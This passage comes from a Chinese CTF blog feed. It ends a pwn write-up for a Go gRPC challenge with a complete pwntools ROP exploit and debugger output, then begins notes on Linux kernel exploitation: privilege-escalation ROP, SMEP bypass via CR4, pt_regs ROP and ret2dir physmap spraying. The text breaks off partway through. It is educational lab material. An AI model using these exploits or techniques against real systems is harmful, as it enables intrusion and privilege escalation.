YBBB.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加个<code>from base64 import</code>再编码后发<code>0x100</code>个<code>a</code>看看，成功控制了返回地址</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">► 0x7ee053    ret    &lt;0x6161616161616161&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看<code>rsp</code>看看多了多少个<code>a</code>判断溢出需要的长度</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/20gx 0xc00016b6f00xc00016b6f0:0x61616161616161610x61616161616161610xc00016b700:0x61616161616161610x61616161616161610xc00016b710:0x61616161616161610x61616161616161610xc00016b720:0x61616161616161610x1010101010100000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> p/x 0x100 - 0x38<span class="token variable">$2</span> <span class="token operator">=</span> 0xc8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最后<code>orw</code>，没开<code>pie</code>，看哪个地址顺眼找个地址<code>orw</code>,<code>read</code>和<code>write</code>的<code>fd</code>都是连蒙带猜，<code>exp</code>运行的时候<code>slepp(3)</code>来再<code>nc</code>一个到<code>23334</code>端口，最后的<code>write</code>也是定位到了这里</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$nc</span> localhost <span class="token number">23334</span>@DubheCTF<span class="token punctuation">&#123;</span>fake_flag<span class="token punctuation">&#125;</span> a� J�@2� J��*� J��*�<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> base64 <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">import</span> grpc<span class="token keyword">import</span> ggbond_pb2<span class="token keyword">import</span> ggbond_pb2_grpc<span class="token keyword">import</span> subprocess<span class="token keyword">import</span> oscontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">23334</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_response</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (WhoamiResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>whoami<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'role_change'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RoleChangeResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>role_change<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'repeater'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RepeaterResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>repeater<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (ErrorResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received an unknown type of response"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">RepeaterRequest</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>repeater<span class="token operator">=</span>ggbond_pb2<span class="token punctuation">.</span>RepeaterRequest<span class="token punctuation">(</span>message<span class="token operator">=</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">WhoamiRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        whoami_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>WhoamiRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>        request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>whoami<span class="token operator">=</span>whoami_request<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">RoleChangeRequest</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        role_change_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>RoleChangeRequest<span class="token punctuation">(</span>role<span class="token operator">=</span>num<span class="token punctuation">)</span>        request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>role_change<span class="token operator">=</span>role_change_request<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span>tty <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/dev/pts/1"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">,</span> buffering<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'nc'</span><span class="token punctuation">,</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">23334</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>tty<span class="token punctuation">,</span> stderr<span class="token operator">=</span>tty<span class="token punctuation">)</span>RoleChangeRequest<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x00000000004101e6</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401537</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x0000000000422398</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000461bd1</span>syscall <span class="token operator">=</span> <span class="token number">0x000000000040452c</span>flag <span class="token operator">=</span> <span class="token number">0x00000000007ef68d</span>addr <span class="token operator">=</span> <span class="token number">0xC56400</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xc8</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>RepeaterRequest<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> grpc </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel漏洞及利用</title>
      <link href="/2024/03/20/kernel-lou-dong-ji-li-yong/"/>
      <url>/2024/03/20/kernel-lou-dong-ji-li-yong/</url>
      
        <content type="html"><![CDATA[<p>十天速通<code>kernel</code>基础理论了属于是…画了个思维导图加深一下印象</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.png" class><h2 id="ROP（returned-oriented-programming）"><a href="#ROP（returned-oriented-programming）" class="headerlink" title="ROP（returned oriented programming）"></a>ROP（returned oriented programming）</h2><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>构造<code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code></p><ul><li><code>kallsyms</code>中存在<code>commit_creds</code>和<code>prepare_kernel_cred</code>函数地址</li><li><code>init</code>中<code>dmesg_restrict=1</code>时不能使用<code>dmesg</code>查看<code>kernel</code>信息</li></ul><h4 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h4><p>保存各寄存器的值到内核栈上便于后续回到用户态，模板如下，编译时指定参数<code>-masm=intel</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">__asm__</span><span class="token punctuation">(</span><span class="token string">"mov user_cs, cs;"</span>            <span class="token string">"mov user_ss, ss;"</span>            <span class="token string">"mov user_sp, rsp;"</span>            <span class="token string">"pushf;"</span>            <span class="token string">"pop user_rflags;"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[34m\033[1m[*] Status has been saved.\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h5><ul><li><code>swapgs</code>指令恢复用户态 <code>GS</code> 寄存器</li><li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li></ul><p>那么我们只需要在内核中找到相应的 <code>gadget</code> 并执行<code>swapgs;iretq</code>就可以成功着陆回用户态。</p><p>通常来说，我们应当构造如下 <code>rop</code> 链以返回用户态并获得一个 <code>shell</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">↓   swapgs    iretq    user_shell_addr    user_cs    user_eflags //64bit user_rflags    user_sp    user_ss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h3><p><code>smap/smep</code>未开启的时候内核可以访问执行用户空间数据，所以可以通过<code>kernel rop</code>以内核<code>ring 0</code>权限执行用户空间代码，主要是执行<code>commit_creds(prepare_kernel_cred(NULL))</code>，需要提前在用户态程序构造好对应的函数指针、获取相应函数地址后直接<code>ret</code>回到用户空间执行</p><h3 id="bypass-smep"><a href="#bypass-smep" class="headerlink" title="bypass-smep"></a>bypass-smep</h3><h4 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h4><p>为了防止 <code>ret2usr</code> 攻击，内核开发者提出了 <code>smep</code> 保护，当 CPU 处于 <code>ring0</code> 模式时，执行用户空间的代码会触发页错误，这个保护在 <code>arm</code> 中被称为 <code>PXN</code></p><h4 id="smep-和-CR4-寄存器"><a href="#smep-和-CR4-寄存器" class="headerlink" title="smep 和 CR4 寄存器"></a>smep 和 CR4 寄存器</h4><p>系统根据 <code>CR4</code> 寄存器的值判断是否开启 <code>smep</code> 保护，当 <code>CR4</code> 寄存器的第 <code>20</code> 位是 <code>1</code> 时，保护开启,是 <code>0</code> 时，保护关闭</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/smep.jpg" class><p><code>CR4</code> 寄存器可以通过 <code>mov</code> 指令修改<code>cr4</code>来关闭<code>smep</code>保护</p><pre class="line-numbers language-none"><code class="language-none">mov cr4, 0x1407e0# 0x1407e0 &#x3D; 101 0 0000 0011 1111 00000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>搜索一下从 <code>vmlinux</code> 中提取出的 <code>gadget</code>，很容易就能达到这个目的</p><ul><li>查看 <code>CR4</code> 寄存器的值<ul><li><code>gdb</code> 无法查看 <code>cr4</code> 寄存器的值，可以通过 <code>kernel crash</code> 时的信息查看。为了关闭 <code>smep</code> 保护，常用一个固定值 <code>0x6f0</code>，即 <code>mov cr4, 0x6f0</code></li></ul></li></ul><h3 id="利用-pt-regs-构造通用内核-ROP"><a href="#利用-pt-regs-构造通用内核-ROP" class="headerlink" title="利用 pt_regs 构造通用内核 ROP"></a>利用 pt_regs 构造通用内核 ROP</h3><h4 id="系统调用-与-pt-regs-结构体"><a href="#系统调用-与-pt-regs-结构体" class="headerlink" title="系统调用 与 pt_regs 结构体"></a>系统调用 与 pt_regs 结构体</h4><p>系统调用：用户态布置好相应的参数后执行 <code>syscall</code> 进入到内核中的 <code>entry_SYSCALL_64</code>，随后通过系统调用表跳转到对应的函数</p><p><code>entry_SYSCALL_64</code> ：当程序进入到内核态时，该函数会将所有的寄存器<strong>压入内核栈上，形成一个 pt_regs 结构体</strong>，该结构体实质上位于内核栈底</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">pt_regs</span> <span class="token punctuation">&#123;</span><span class="token comment">/* * C ABI says these regs are callee-preserved. They aren't saved on kernel entry * unless syscall needs a complete, fully filled "struct pt_regs". */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r15<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r14<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r13<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r12<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rbp<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rbx<span class="token punctuation">;</span><span class="token comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r11<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r10<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r9<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r8<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rax<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rcx<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rdx<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rsi<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rdi<span class="token punctuation">;</span><span class="token comment">/* * On syscall entry, this is syscall#. On CPU exception, this is error code. * On hw interrupt, it's IRQ number: */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> orig_rax<span class="token punctuation">;</span><span class="token comment">/* Return frame for iretq */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rip<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> cs<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eflags<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rsp<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ss<span class="token punctuation">;</span><span class="token comment">/* top of stack page */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="内核栈与通用ROP"><a href="#内核栈与通用ROP" class="headerlink" title="内核栈与通用ROP"></a>内核栈与通用ROP</h4><p>内核栈<strong>只有一个页面的大小</strong>，而 <code>pt_regs</code> 结构体则固定位于<strong>内核栈栈底</strong>，劫持内核结构体中的某个函数指针（例如 <code>seq_operations-&gt;start</code>）并通过该函数指针劫持内核执行流时 <strong>rsp 与 栈底的相对偏移通常是不变的</strong></p><p>系统调用过程中的这些寄存器为我们布置 <code>ROP</code> 链提供了可能，<strong>只需要寻找到一条形如 <code>add rsp, val ; ret</code> 的 gadget 便能够完成 ROP</strong></p><p>模板：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">__asm__(    &quot;mov r15,   0xbeefdead;&quot;    &quot;mov r14,   0x11111111;&quot;    &quot;mov r13,   0x22222222;&quot;    &quot;mov r12,   0x33333333;&quot;    &quot;mov rbp,   0x44444444;&quot;    &quot;mov rbx,   0x55555555;&quot;    &quot;mov r11,   0x66666666;&quot;    &quot;mov r10,   0x77777777;&quot;    &quot;mov r9,    0x88888888;&quot;    &quot;mov r8,    0x99999999;&quot;    &quot;xor rax,   rax;&quot;    &quot;mov rcx,   0xaaaaaaaa;&quot;    &quot;mov rdx,   8;&quot;    &quot;mov rsi,   rsp;&quot;    &quot;mov rdi,   seq_fd;&quot;        &#x2F;&#x2F; 这里假定通过 seq_operations-&gt;stat 来触发    &quot;syscall&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新版本内核中为系统调用栈添加了一个偏移值，这意味着 <code>pt_regs</code> 与我们触发劫持内核执行流时的栈间偏移值不再是固定值，在这个随机偏移值较小且我们仍有足够多的寄存器可用的情况下，仍然可以通过布置一些 <code>slide gadget</code> 来继续完成利用，不过稳定性也大幅下降了</p><h3 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h3><p>主要用来<strong>绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段</strong></p><p>我们首先来思考一下 <code>x86</code> 下的 <code>Linux kernel</code> 的内存布局，存在着这样的一块区域叫做 <code>direct mapping area</code>，<strong>线性地直接映射了整个物理内存空间</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ffff888000000000 <span class="token operator">|</span> <span class="token parameter variable">-119.5</span>  TB <span class="token operator">|</span> ffffc87fffffffff <span class="token operator">|</span>   <span class="token number">64</span> TB <span class="token operator">|</span> direct mapping of all physical memory <span class="token punctuation">(</span>page_offset_base<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这块区域的存在意味着：对于一个被用户进程使用的物理页框，<strong>同时存在着一个用户空间地址与内核空间地址到该物理页框的映射</strong>，即我们利用这两个地址进行内存访问时访问的是同一个物理页框</p><p>当开启了 <code>SMEP、SMAP、PXN</code> 等防护时，内核空间到用户空间的直接访问被禁止，<strong>我们无法直接使用类似 ret2usr 这样的攻击方式</strong>，但利用内核线性映射区对整个物理地址空间的映射，<strong>我们可以利用一个内核空间上的地址访问到用户空间的数据，从而绕过 SMEP、SMAP、PXN 等传统的隔绝用户空间与内核空间的防护手段</strong></p><p>下图是<code>ret2dir</code> 的示例，在用户空间中布置的 <code>gadget</code> 可以通过 <code>direct mapping area</code> 上的地址<strong>在内核空间中访问到</strong>：</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/ret2dir-shellcode.png" class><p>新版的内核当中 <code>direct mapping area</code> 已经不再具有可执行权限，因此很难在用户空间直接布置 <code>shellcode</code> 进行利用，但仍能通过在用户空间布置 <code>ROP</code> 链的方式完成利用：</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/ret2dir-rop.png" class><p><code>ret2dir</code> 攻击的手法：</p><ul><li>利用 <code>mmap</code> 在用户空间大量喷射内存</li><li>利用漏洞泄露出内核的 “堆” 上地址（通过 <code>kmalloc</code> 获取到的地址），<strong>这个地址<u>直接来自于线性映射区</u></strong></li><li>利用泄露出的内核线性映射区的地址<strong>进行内存搜索</strong>，从而找到我们在用户空间喷射的内存</li></ul><p>此时获得了一个映射到用户空间的内核空间地址，通过这个内核空间地址便能直接访问到用户空间的数据，避开传统的隔绝用户空间与内核空间的防护手段</p><p>需要注意的是我们往往没有内存搜索的机会，因此需要使用 <code>mmap</code> 喷射大量的物理内存写入同样的 <code>payload</code>，之后再随机挑选一个线性映射区上的地址进行利用，这样就有很大的概率命中到我们布置的 <code>payload</code> 上，这种攻击手法也称为 <code>physmap spray</code></p><h2 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="内存三级结构"><a href="#内存三级结构" class="headerlink" title="内存三级结构"></a>内存三级结构</h4><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/page-zone-node.png" class><ul><li><p>页-<code>page</code></p><p><code>linux kernel</code>使用<code>page</code>结构体表示一个物理页，对应图中结构体<code>page</code></p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/page_struct.png" class></li><li><p>区-<code>zone</code></p><p><code>linux</code>将一个<strong>节点内</strong>不同用途的内存区域划分为不同的区，对应图中结构体<code> zone</code></p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/zone_struct.png" class></li><li><p>节点-<code>node</code></p><p><code>Linux</code> 将内存控制器（<code>memory controller</code>）作为节点划分的依据，同一个内存控制器下的 <code>CPU</code> 对应的节点称之为<strong>本地内存</strong>，不同处理器之间通过总线进行进一步的连接，对应图中结构体<code>pgdata_list</code></p></li></ul><h4 id="内存管理器"><a href="#内存管理器" class="headerlink" title="内存管理器"></a>内存管理器</h4><ul><li><p><code>buddy system</code></p><p>负责以<strong>内存页</strong>为粒度管理所有可用的物理内存,存在于<strong>区级别</strong>，对当前区的所有物理页进行管理，每个区<code>zone</code>结构体中有<code>free_area</code>结构体数组，存储<code>buddy system</code>按照<code>order</code>管理的页面，其中<code>MAX_ORDER = 11</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">zone</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//...</span>    <span class="token keyword">struct</span> <span class="token class-name">free_area</span>    free_area<span class="token punctuation">[</span>MAX_ORDER<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>buddy system</code> 中按照空闲页面的连续大小进行分阶管理，这里的 <code>order</code> 